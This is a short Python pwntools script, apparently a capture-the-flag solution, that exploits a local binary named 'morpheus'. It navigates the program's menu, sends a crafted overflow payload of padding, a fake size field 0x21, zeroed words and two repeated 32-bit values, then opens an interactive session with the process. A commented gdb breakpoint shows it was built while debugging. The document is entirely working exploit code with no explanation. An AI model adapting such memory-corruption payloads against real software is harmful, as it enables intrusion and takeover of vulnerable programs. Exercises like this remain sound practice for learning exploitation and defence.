from pwn import *

p = process("./morpheus")

def change_name():
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("ID: ", "2")

def exploit():
    padding = 40
    change_name()

    payload = ""
    payload += "A" * padding
    payload += p32(0x21)
    payload += "A" * 4
    payload += p32(0) * 2
    payload += p32(0x77359423)
    payload += p32(0x77359423)

    #gdb.attach(p, '''
    #            b *service+464
    #            c
    #            ''')

    p.sendline(payload)
    p.sendline("4")
    p.interactive()

if __name__ == "__main__":
    exploit()